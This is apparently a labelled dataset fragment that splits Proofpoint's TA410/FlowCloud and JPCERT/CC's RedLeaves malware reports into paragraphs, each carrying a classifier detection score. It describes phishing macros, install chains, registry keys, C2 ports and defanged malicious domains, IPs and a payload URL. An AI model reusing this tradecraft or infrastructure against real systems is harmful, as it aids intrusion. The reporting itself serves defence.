        "text": "Our analysis of these phishing campaigns determined that the PE attachments delivered a modular malware which the developers referred to in program data base (\u201cPDB\u201d) paths as \u201cFlowCloud\u201d. We therefore refer to these campaigns as \u201cFlowCloud\u201d based on the malware family they delivered. It\u2019s notable that these FlowCloud campaigns were occurring at the same time as the LookBack campaigns that Proofpoint has previously documented.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6558025479316711
        },
        "prediction": {}
    },
    {
        "text": "In some cases, both FlowCloud and LookBack campaigns targeted not only the same companies but also the same recipients.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6566807627677917
        },
        "prediction": {}
    },
    {
        "text": "The senders of the emails that delivered FlowCloud malware utilized threat actor-controlled domains for delivery which impersonated energy sector training services, as well as utilized subdomains which contained the word \u201cengineer\u201d.\n We observed a distinct change in FlowCloud delivery tactics beginning with attacks carried out in November 2019. The targeting of US utilities companies remained constant, but the threat actors shifted from PE attachments to malicious macro laden Microsoft Word documents that closely resembled the same delivery and installation macros used in LookBack malware campaigns.\n Additionally, in November threat actors began to utilize the sender domain asce[.]email to deliver these attachments.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.371692419052124
        },
        "prediction": {}
    },
    {
        "text": "This domain was first observed in June 2019 registered to the IP 103.253.41[.]75 which was used as a staging and reconnaissance IP in previous LookBack campaigns. On October 29, 2019, the domain resolved to the IP 134.209.99[.]169 which also hosted several energy certification and education themed domains. A number of these domains also shared an SSL certificate with delivery domains previously observed in the July and August 2019 FlowCloud phishing campaigns. The data from this SSL Certificate has been displayed in Figure 2.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.42561063170433044
        },
        "prediction": {}
    },
    {
        "text": "This figure demonstrates the actor\u2019s use of a single SSL certificate for multiple energy and training themed domains. The actor listed the domains that were signed by the certificate in the Alternative Names field allowing for the identification of additional related infrastructure. A number of these domains were used in FlowCloud campaigns.\n\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6613853573799133
        },
        "prediction": {}
    },
    {
        "text": "The table below shows the TA410 staging IPs, when they were first observed, the registered domains associated with them, and the malware delivered by emails originating from these domains.\n\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6823145747184753
        },
        "prediction": {}
    },
    {
        "text": "IP\n\n\nFirst Observed\n\n\nRegistered Domains\n\n\nMalware Delivered\n\n\n103.253.41[.]75\n\n\n06/23/2019\n\n\nDelivery Domain:\nNceess[.]com\nGlobalenergycertification[.]com\n\u00a0\nRegistered Domain:\nNerc[.]email\nAsce[.]email\n\n\nLookBack\n\n\n134.209.99[.]169\n\n\n10/29/2019\n\n\nDelivery Domain:\nAsce[.]email\n\u00a0\nRegistered Domain:\n Powersafetraining[.]net\n\u00a0\nDomains Related by SSL Certificate:\nmails.energysemi[.]com\npowersafetrainings[.]org\nwww.mails.energysemi[.]com\nwww.powersafetraining[.]net www.powersafetrainings[.]org\n\n\nFlowCloud\n\n\n101.99.74[.]234\n\n\n07/02/2019\n\n\nDelivery Domain\nwww.powersafetrainings[.]org\n\n\nFlowCloud\n\nThe content of the emails in the November 2019 campaigns impersonated the American Society of Civil Engineers and masqueraded as the legitimate domain asce[.]org.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.1867927461862564
        },
        "prediction": {}
    },
    {
        "text": "The structure of this email is very similar to the LookBack delivery emails constructed to impersonate the NCEES and Global Energy Certification in July 2019. Examples of the emails are included in Figure 3 and Figure 4.\n\nFigure 3 ASCE-themed phishing email delivering FlowCloud malware November 2019\n\nFigure 4 NCEES-themed phishing email delivering LookBack malware July 2019\nExploitation - Installation Macros\nAs noted above, after an extended period of using PE attachments to deliver FlowCloud in campaigns, the threat actors behind FlowCloud switched to using Microsoft Word documents with malicious macros at the beginning of November 2019. The Word document attachments and macros delivering FlowCloud had key similarities with the Word document attachments and macros we identified that delivered LookBack in July and August 2019.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.36917176842689514
        },
        "prediction": {}
    },
    {
        "text": "Identical to the methodology used with LookBack, the FlowCloud macro used privacy enhanced mail (\u201c.pem\u201d)\u00a0 files which were subsequently renamed to the text file \u201cpense1.txt\u201d. This file is next saved as a portable executable file named \u201cgup.exe\u201d and executed using a version of the certutil.exe tool named \u201cTemptcm.tmp\u201d.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.5824334621429443
        },
        "prediction": {}
    },
    {
        "text": "For comparison, Figure 5 November 2019 macro used to install FlowCloud malware shows the macro used to install FlowCloud while Figure 6 August 2019 macro used to install LookBack malware shows the macro used to install LookBack.\n\n  Figure 5 November 2019 macro used to install FlowCloud malware\n\nFigure 6 August 2019 macro used to install LookBack malware\nThe \u201cExploitation\u201d section in our blog \u00a0LookBack Malware Targets the United States Utilities Sector with Phishing Attacks Impersonating Engineering Licensing Boards has a more in-depth explanation of this method used by LookBack.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.5236374139785767
        },
        "prediction": {}
    },
    {
        "text": "While we found the ultimate execution method for both the LookBack Gup proxy tool and FlowCloud malware were the same across both macro versions, we found that the FlowCloud macro introduced a new method for the delivery of the malware.\n  The earlier LookBack versions of the macro included the payload in numerous privacy enhanced email (\u201c.pem\u201d) files that were dropped when the attachment file is executed by the user.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.639947235584259
        },
        "prediction": {}
    },
    {
        "text": "The FlowCloud version of the macro utilized a previously unobserved macro section to download the payload from a DropBox URL.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.7337324023246765
        },
        "prediction": {}
    },
    {
        "text": "Once the payload was downloaded, a FlowCloud malware PE in the form of a .pem file was saved as the variable \u201cPense1.txt\u201d.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.668616533279419
        },
        "prediction": {}
    },
    {
        "text": "Figure 7 FlowCloud Malware Macro delivery code shows the FlowCloud macro with the delivery section in question called out.\n\n Figure 7 FlowCloud Malware Macro delivery code\nThe FlowCloud macro also contained a strange try\u2026 catch statement which initially attempts to download the FlowCloud payload from the DropBox URL as part of the try statement. However, if it was unable to retrieve the payload from that resource, a catch statement which was nearly identical to the try statement attempted to retrieve a malware resource from the URL http://ffca.caibi379[.]com/rwjh/qtinfo.txt\u201d.\u201d.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.5246924757957458
        },
        "prediction": {}
    },
    {
        "text": "Figure 8 FlowCloud Malware Catch statement macro code shows the catch statement in question.\n\n Figure 8 FlowCloud Malware Catch statement macro code\nThis try\u2026catch sequence is significant because the URL in the catch statement and malware resource was previously mentioned in a May 2019 blog by enSilo entitled \u201cUncovering New Activity by APT10\u201d. The blog claims that this URL delivered a modified Quasar RAT payload which included the addition of SharpSploit, an opensource post-exploitation tool. When analyzed on the same date of FlowCloud campaign delivery this URL and resource was unavailable, while the DropBox URL successfully delivered the FlowCloud .pem file. While Proofpoint has not independently verified these attribution claims made by other researchers regarding the referenced Quasar RAT sample, the use of this URL represents a previously undisclosed overlap with publicly reported indicators of compromise attributed to TA429 (APT10). While on the surface this domain may imply links to TA429 (APT10), we have identified several aberrations regarding the domain registration information and inactive nature of the URL and will discuss them at length at length later in this blog.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.3249596655368805
        },
        "prediction": {}
    },
    {
        "text": "FlowCloud Malware\nOur analysis of the FlowCloud malware determined that it is a multi-stage payload comprised of a large code base written in C++.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6358497142791748
        },
        "prediction": {}
    },
    {
        "text": "The code demonstrates a level of complexity including numerous components, extensive object-oriented programming, and use of legitimate and imitation QQ files for initial and later stage execution. We found further imitation of QQ components in several modules used throughout FlowCloud execution. The malware name \u201cFlowCloud\u201d was taken from distinctive PDB paths observed in numerous malware components. These values have been included in the IOCs section at the end of this blog.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.5985932946205139
        },
        "prediction": {}
    },
    {
        "text": "FlowCloud malware is capable of RAT functionalities based on its available commands including accessing the clipboard, installed applications, keyboard, mouse, screen, files, services, and processes with the ability to exfiltrate information via command and control.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.5788756012916565
        },
        "prediction": {}
    },
    {
        "text": "Additionally, the malware variants analyzed have several distinct characteristics that indicate the malware may have been active in the threat landscape since at least July 2016.\n In addition to components built to target updated Windows versions, FlowCloud samples have dropped a 32-bit module that was only compatible with Windows versions 6 (Windows Vista) and below. The dated nature of this binary coupled with the extensible nature of the malware code suggests that the FlowCloud code base has been under development for numerous years. Public reports around FlowCloud malware components and related installation directory paths suggest that versions of this malware may have been observed in the wild as early as July 2016. Additionally, development of this malware around legitimate QQ files and the identification of malware samples uploaded to VirusTotal from Japan in December 2018 and earlier this year from Taiwan indicate that the malware may have been active for some time in Asia prior to its appearance targeting the US utilities sector.\n Figure 9 Flowchart of FlowCloud Loader Functionality below outlines FlowCloud\u2019s loader functionality.\n\n Figure 9 Flowchart of FlowCloud Loader Functionality\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.3908257782459259
        },
        "prediction": {}
    },
    {
        "text": "The malware begins with the execution of Gup.exe by the malicious macro which in turn executes the file EhStorAuthn.exe.\n EhStorAuthn.exe extracts the subsequent payload file components and installs them to the directory C:\\Windows\\Media\\SystemPCAXD\\ado\\fc. This file also sets registry key values that store the keylogger drivers and the malware configuration as the value \u201cKEY_LOCAL_MACHINE\\SYSTEM\\Setup\\PrintResponsor\\<2-4>\u201d.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.4068952798843384
        },
        "prediction": {}
    },
    {
        "text": "EhStorAuthn.exe is a legitimate portable executable file used by QQ with the initial name QQSetupEx.exe. This file is used to load the file dlcore.dll as part of its natural downloader routine.\n Dlcore.dll is a DLL crafted by the threat actors that functions as a shellcode injector pulling the shellcode from a file named rebare.dat.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.4212742745876312
        },
        "prediction": {}
    },
    {
        "text": "When the shellcode within rebare.dat is executed it in turn executes a RAT installer file named rescure.dat.\n\u00a0 Rescure.dat is an XOR encrypted DLL file that installs the RAT based application responsor.dat which installs the keylogger driver and manages the RAT functionality.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.5551324486732483
        },
        "prediction": {}
    },
    {
        "text": "Responsor.dat unpacks several modules (rescure86.dat or rescure64.dat) to the registry %TEMP%\\{0d47c9bc-7b04-4d81-9ad8-b2e00681de8e}\" and installs the unpacked file as a service named \u201cFSFilter Activity Monitor\u201d or \u201cFltMgr\u201d.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.48460638523101807
        },
        "prediction": {}
    },
    {
        "text": "Several legitimate Microsoft Windows files were also used by the malware for thread injection.\n EhStorAuthn_shadow.exe (hhw.exe) a Microsoft HTML Help Workshop file was used as a placeholder for thread injection.\n Hha.dll is a component of Microsoft HTML Help Workshop and is required to run EhStorAuthn_shadow.exe.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.4441628158092499
        },
        "prediction": {}
    },
    {
        "text": "The malware stores its configuration in the registry alongside drivers utilized by the malware\u2019s keylogger components. Several additional distinct registry keys are generated which indicate the malware\u2019s current execution stage on the host.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.7560319900512695
        },
        "prediction": {}
    },
    {
        "text": "Registry Key\n\n\nOriginating Component\n\n\nDescription\n\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\Setup\\PrintResponsor\\2\n\n\nGup.exe\n\n\n32bit Driver, Keylogger\n\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\Setup\\PrintResponsor\\3\n\n\nGup.exe\n\n\n64bit Driver, Keylogger\n\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\Setup\\PrintResponsor\\4\n\n\nGup.exe\n\n\nRAT config\n\n\nHKEY_LOCAL_MACHINE\\HARDWARE\\{2DB80286-1784-48b5-A751-B6ED1F490303}\n\n\nDlcore.dll\n\n\nExecution Stage Executing dlcore.dll\n\n\nHKEY_LOCAL_MACHINE\\HARDWARE\\{804423C2-F490-4ac3-BFA5-13DEDE63A71A}\n\n\nrescure.dat\n\n\nExecution Stage Install keylogger driver\n\n\nHKEY_LOCAL_MACHINE\\HARDWARE\\{A5124AF5-DF23-49bf-B0ED-A18ED3DEA027}\n\n\nrescure.dat\n\n\nExecution Stage\u00a0 \nRAT fully installed.\n\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.15114839375019073
        },
        "prediction": {}
    },
    {
        "text": "FlowCloud Configuration\nThe FlowCloud loader component EhStorAuthn.exe stores the malware configuration in the registry early in the installation chain and is represented in the table above.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6997285485267639
        },
        "prediction": {}
    },
    {
        "text": "The Registry data is composed of multiple encrypted headers (using XORs and RORs) and data is encrypted using a modified (or broken) AES algorithm. The plaintext data is compressed with ZLIB and serialized using Google\u2019s Protocol Buffers. \ufffcFigure 10 shows an example of a configuration as displayed by FlowCloud\u2019s debug logging:\n\nFigure 10 Example of a configuration as displayed by debug logging\nCommand and Control\nFlowCloud malware handles configuration updates, file exfiltration, and commands as independent threads utilizing a custom binary C2 protocol. We identified these independent threads as part of an extensive command handling functionality with distinct command managers existing for each command. The sample we analyzed utilized port 55555 for file exfiltration and port 55556 for all other data. We identified FlowCloud communication with the IP 188.131.233[.]27.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.3094300627708435
        },
        "prediction": {}
    },
    {
        "text": "The requests and responses are composed of multiple encrypted headers (using XORs and RORs) and TEA encrypted data using a key generation scheme involving a hardcoded string of random characters and MD5 hashing.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6110631227493286
        },
        "prediction": {}
    },
    {
        "text": "An example parsing of an initial beacon is demonstrated in Figure 11 Example of FlowCloud parsing an initial C2 beacon:\n\nFigure 11 Example of FlowCloud parsing an initial C2 beacon\nComparing Public TA429 (APT10) Indicators with TA410 Campaigns\nPublications by FireEye and EnSilo regarding TA429 (APT10) campaigns contain indicators that later appeared in TA410 campaigns. In our retrospective analysis of that research, we determined that TA429 (APT10) used phishing macros that were later seen being used by LookBack and FlowCloud malware. Additionally, we identified the Quasar RAT delivery URL hxxp://ffca.caibi379[.]com/rwjh/qtinfo.txt used by FlowCloud macros in November, which was published in the enSilo report prior to observable weaponization for TA410 campaigns.\n  Interestingly, the compilation date of several LookBack malware modules used in July 2019 were September 14, 2018.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.31767964363098145
        },
        "prediction": {}
    },
    {
        "text": "This includes the SodomMain and SodomNormal modules covered in previous Proofpoint blogs on LookBack malware.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6732800602912903
        },
        "prediction": {}
    },
    {
        "text": "That date is just one day after FireEye released their initial analysis of similar TA429 (APT10) macros utilized in Japan on September 13, 2018.\n  While LookBack malware samples were not observed in the wild until June 2019, this September 2018 compilation date demonstrates a large lag time between compilation and delivery.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.5420544147491455
        },
        "prediction": {}
    },
    {
        "text": "This possibly suggests manipulation of compilation times by threat actors but has not been conclusively determined.\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.5287700891494751
        },
        "prediction": {}
    },
    {
        "text": "Most of the domain registration (weaponization) for LookBack and FlowCloud campaigns began in May and June 2019 respectively.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6291940212249756
        },
        "prediction": {}
    },
    {
        "text": "Additionally, enSilo\u2019s publication on potentially TA429 (APT10) related Quasar RAT samples was published on May 24, 2019.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": false,
            "confidence": 0.4998626112937927
        },
        "prediction": {}
    },
    {
        "text": "It was not until the second week of November 2019 when the inactive URL was incorporated into a phishing macro as part of a FlowCloud campaign targeting US utilities.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6846107244491577
        },
        "prediction": {}
    },
    {
        "text": "WHOIS records and passive DNS information for ffca.caibi379[.]com indicate that the registrant email and address fields for the domain were updated on June 7, 2019.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.5997189283370972
        },
        "prediction": {}
    },
    {
        "text": "The A record for the domain was updated on September 9, 2019 at which time it resolved to the IP 34.80.27[.]200 contained within an ASN owned by Google. For the prior eight months beginning on January 2, 2019 and encompassing the period of activity discussed by enSilo, the domain was hosted on several IP\u2019s in an ASN owned by APNIC Hostmaster.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.5586950182914734
        },
        "prediction": {}
    },
    {
        "text": "The shift away from IP infrastructure owned by APNIC represents a departure in threat actor infrastructure hosting tactics well after the publication by enSilo and within the weaponization period for TA410\u2019s campaign targeting US utilities.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6948330998420715
        },
        "prediction": {}
    },
    {
        "text": "While this research is not conclusive, it demonstrates that all observed TA429 (APT10) similarities and indicators of compromise were available publicly prior to the start of TA410 campaigns.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.5966724753379822
        },
        "prediction": {}
    },
    {
        "text": "Therefore, while not conclusive from current analysis, the possibility remains that these overlaps represent false flag activity by the TA410 threat actor.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6583678722381592
        },
        "prediction": {}
    },
    {
        "text": "Based on this analysis Proofpoint analysts track TA410 as a distinct threat actor from TA429 (APT10) at this time.\n ",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6125841736793518
        },
        "prediction": {}
    },
    {
        "text": "Conclusion\nThe convergence of LookBack and FlowCloud malware campaigns in November 2019 demonstrates the capabilities of TA410 actors to distinctly utilize multiple tools as part of a single ongoing campaign against US utilities providers.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.654998242855072
        },
        "prediction": {}
    },
    {
        "text": "Both malware families demonstrate a level of sophistication in their conception and development while the extensible code base of FlowCloud malware suggests that this group may have been operating as early as 2016.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6608734726905823
        },
        "prediction": {}
    },
    {
        "text": "TA410 operators demonstrate a willingness to dynamically evolve phishing tactics to increase the effectiveness of their campaigns and a keen eye towards plausible social engineering within a very select targeted sector.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.7099118828773499
        },
        "prediction": {}
    },
    {
        "text": "It remains unclear if the nature of the tactics and indicators that are shared with TA429 (APT10) were developed by this group or culled from readily available technical reporting that pre-dated these campaigns.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6591906547546387
        },
        "prediction": {}
    },
    {
        "text": "The possibility remains that these overlaps represent intentional false flag efforts to cloak the identity of these perpetrators while they targeted a critical and geo-politically sensitive sector of energy providers in the US.",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6933688521385193
        },
        "prediction": {}
    },
    {
        "text": "Regardless of the actor\u2019s intention, TA410 has established itself as a motivated actor with mature toolsets carrying out long term campaigns against highly important and geographically concentrated target sets.\nIndicators of Compromise (IOCs)\n\n",
        "source": "TA410_ Malware Attacks Against U.S. Utilities Sector _ Proofpoint US.html",
        "detection": {
            "response": true,
            "confidence": 0.6487892270088196
        },
        "prediction": {}
    },
    {
        "text": "\n\n  \nRedLeaves - Malware Based on Open Source RAT - JPCERT/CC Eyes | JPCERT Coordination Center official Blog\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n      \n\n\n\n\n\n\n \n\n\n\n\n\n\n\n\n\nJPCERT/CC Eyes\n\nJPCERT Coordination Center official Blog\n\nLanguage:\n\n\n\u65e5\u672c\u8a9e\nEnglish\n\n\n\n\n\n\n\nTop\u00a0>\u00a0List of \u201cMalware\u201d\u00a0>\u00a0RedLeaves - Malware Based on Open Source RAT\n      \n\n\n\n\n\n\n\n\n\n\n\n\n\u671d\u9577 \u79c0\u8aa0 (Shusei Tomonaga)\n\n\nApril  3, 2017\n\n\nRedLeaves - Malware Based on Open Source RAT\n\n\n\nRedLeaves\n\n\n\n\n\n\n\n\n\n Email\n\n\n\n\nHi again, this is Shusei Tomonaga from the Analysis Center.\n",
        "source": "RedLeaves - Malware Based on Open Source RAT - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.3458390533924103
        },
        "prediction": {}
    },
    {
        "text": "Since around October 2016, JPCERT/CC has been confirming information leakage and other damages caused by malware \u2018RedLeaves\u2019.",
        "source": "RedLeaves - Malware Based on Open Source RAT - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5587844252586365
        },
        "prediction": {}
    },
    {
        "text": "It is a new type of malware which has been observed since 2016 in attachments to targeted emails.\n This entry introduces details of RedLeaves and results of our analysis including its relation to PlugX, and a tool which is used as the base of this malware.\n How RedLeaves runs\nTo have the RedLeaves injected into the process of Internet Explorer, the following steps will be taken (Figure1):\nFigure 1: Flow of events until RedLeaves runs\n\n\n\n\n\n\nMalware samples that JPCERT/CC has analysed create the following three files in %TEMP% folder and execute a legitimate application when executed.\n\n A legitimate application (EXE file): a signed, executable file which reads a DLL file located in the same folder\nA Loader (DLL file): a malicious DLL file which is loaded by the legitimate application\nEncoded RedLeaves (DATA file): Encoded data which is read by the loader\n\nWhen the legitimate application is executed, it loads the loader located in the same folder through DLL Hijacking (DLL preloading).\n The loader, which is loaded in the legitimate application, reads and decodes the encoded RedLeaves and then executes it. The executed RedLeaves launches a process (Internet Explorer) depending on its configuration, and injects itself there.",
        "source": "RedLeaves - Malware Based on Open Source RAT - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.21382246911525726
        },
        "prediction": {}
    },
    {
        "text": "Then, RedLeaves starts running in the injected process. The following section explains the behaviour of the injected RedLeaves.\n",
        "source": "RedLeaves - Malware Based on Open Source RAT - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.7165928483009338
        },
        "prediction": {}
    },
    {
        "text": "Behaviour of RedLeaves\nRedLeaves communicates to specific sites by HTTP or its custom protocol and executes commands that are received.",
        "source": "RedLeaves - Malware Based on Open Source RAT - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5216854214668274
        },
        "prediction": {}
    },
    {
        "text": "Figure 2: Injected RedLeaves\n\n\n\n\n\n\nThe injected RedLeaves connects to command and control (C&C) servers by HTTP POST request or its custom protocol. Destination hosts and communication methods are specified in its configuration.",
        "source": "RedLeaves - Malware Based on Open Source RAT - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6116700768470764
        },
        "prediction": {}
    },
    {
        "text": "The data is encrypted with RC4 (the key is stored in its configuration) and contains the following: \n__msgid=23.__serial=0.clientid=A58D72524B51AA4DBBB70431BD3DBBE9\nThe data received from the C&C servers contain commands. Depending on the received commands, RedLeaves executes the following functions (Please see Table B-3 in Appendix B for the details of received data):\n\nOperation on files\nExecute arbitrary shell commands\nConfigure communication methods\nSend drive information\nSend system information\nUpload/download files\nScreen capture\nExecute proxy function\n\nBase of RedLeaves\u2019s Code\nJPCERT/CC analysed RedLeaves and confirmed that its code has a lot in common with the source code of Trochilus[1], a type of RAT (Remote Administration Tool), which is available on Github.",
        "source": "RedLeaves - Malware Based on Open Source RAT - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.3964502811431885
        },
        "prediction": {}
    },
    {
        "text": "It is clear that it processes the same data as listed in Table B-3 in Appendix B.\nFigure 3: Part of Trochilus\u2019s source code\n\n\n\n\n\n\n It is presumed that RedLeaves is built on top of Trochilus\u2019s source code, rather than from scratch.\n Relation to PlugX\nComparing RedLeaves samples that JPCERT/CC has observed with PlugX, used by certain attacker groups in the past, we identified that similar code is used in some processes. Below are the sequence of instructions observed when the sample creates three files (a legitimate application, a loader and encoded RedLeaves or PlugX).\n Figure 4: Comparison of file creation process\n\n\n\n\n\n\nFurthermore, the process in which the loader decodes the encoded data (encoded RedLeaves or PlugX) is similar.\n Figure 5: Comparison of file decode process\n\n\n\n\n\n\nJPCERT/CC has also confirmed that some of the RedLeaves and PlugX samples that share the above code also communicate with common hosts. From this observation, it is presumed that the attacker group using RedLeaves may have used PlugX before.\n Summary\nRedLeaves is a new type of malware being observed since 2016 in attachments to targeted emails.",
        "source": "RedLeaves - Malware Based on Open Source RAT - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.23319083452224731
        },
        "prediction": {}
    },
    {
        "text": "The hash values of the samples introduced here are listed in Appendix C. Some of the RedLeaves\u2019 destination hosts that JPCERT/CC has confirmed are also listed in Appendix D. Please check your devices for any suspicious communication with such hosts.\n",
        "source": "RedLeaves - Malware Based on Open Source RAT - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.6652963161468506
        },
        "prediction": {}
    },
    {
        "text": "Since December 2012, he has been engaged in malware analysis and forensics investigation, and is especially involved in analyzing incidents of targeted attacks.",
        "source": "RedLeaves - Malware Based on Open Source RAT - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": false,
            "confidence": 0.46088987588882446
        },
        "prediction": {}
    },
    {
        "text": "Prior to joining JPCERT/CC, he was engaged in security monitoring and analysis operations at a foreign-affiliated IT vendor.",
        "source": "RedLeaves - Malware Based on Open Source RAT - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5883171558380127
        },
        "prediction": {}
    },
    {
        "text": "If you wish to make comments or ask questions, please use this form.\n\n This form is for comments and inquiries.",
        "source": "RedLeaves - Malware Based on Open Source RAT - JPCERT_CC Eyes _ JPCERT Coordination Center official Blog.html",
        "detection": {
            "response": true,
            "confidence": 0.5061925649642944
        },
        "prediction": {}
    },
    {
